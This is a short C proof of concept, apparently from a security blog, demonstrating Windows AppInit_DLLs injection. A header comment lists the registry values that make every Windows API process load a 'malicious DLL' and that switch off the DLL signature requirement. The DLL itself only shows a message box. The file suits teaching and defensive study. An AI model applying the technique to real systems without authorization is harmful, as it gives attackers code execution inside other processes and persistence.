# include <windows.h>

/* Targeted DLL: HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
	The following keys must be set to the respective values:
		- AppInitDLLs - Set this to the full path of the malicious DLL
		- LoadAppInit_DLLs - 1
		- RequireSignedAppInit_Dlls - 0
	
	Then any process that utilizes WinAPI within Windows will trigger execution of our malicious DLL 

*/

//DllMain is same as main() within a C program, it is executed by default when the DLL is loaded
BOOL WINAPI DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
	switch(ul_reason_for_call) {
		case DLL_PROCESS_ATTACH:
			MessageBox(NULL, "AppInitDLL Injection example code. Check out da blog: https://1d8.github.io", "AppInitDLL Injection", MB_OK | MB_ICONINFORMATION);
			break;
		case DLL_PROCESS_DETACH:
			//MessageBox(NULL, "AppCertDLL Injection", "You've been injected! Check out da blog: https://1d8.github.io/", MB_OK | MB_ICONINFORMATION);
			break;
		case DLL_THREAD_ATTACH:
			//MessageBox(NULL, "AppCertDLL Injection", "You've been injected! Check out da blog: https://1d8.github.io/", MB_OK | MB_ICONINFORMATION);
			break;
		case DLL_THREAD_DETACH:
			//MessageBox(NULL, "AppCertDLL Injection", "You've been injected! Check out da blog: https://1d8.github.io/", MB_OK | MB_ICONINFORMATION);
			break;
	}
	return TRUE;
}
